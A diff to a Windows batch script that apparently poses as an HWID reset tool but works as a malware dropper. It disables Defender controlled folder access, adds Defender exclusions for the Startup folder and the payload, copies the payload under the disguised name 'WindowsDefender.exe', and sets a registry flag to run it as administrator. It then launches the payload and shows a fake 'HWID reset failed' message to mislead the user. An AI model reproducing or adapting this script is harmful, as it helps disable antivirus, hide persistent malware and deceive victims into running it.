@@ -34,6 +34,7 @@ powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
 ::windows defender exclusions
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"WindowsDefender.exe'"
 
 ::direct download link
 ::edit this to your files
@@ -47,8 +48,10 @@ NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Window
 ::unblock files
 ::change paths to file location
 powershell -command "unblock-file -path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe'"
-start "Windows.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe"
 del NSudo.exe
+copy "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefender.exe"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe" /t REG_SZ /d "~ RUNASADMIN" /f
+start "Windows.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe"
 echo msgbox "HWID reset failed." > tmp.vbs
 wscript tmp.vbs
 del tmp.vbs
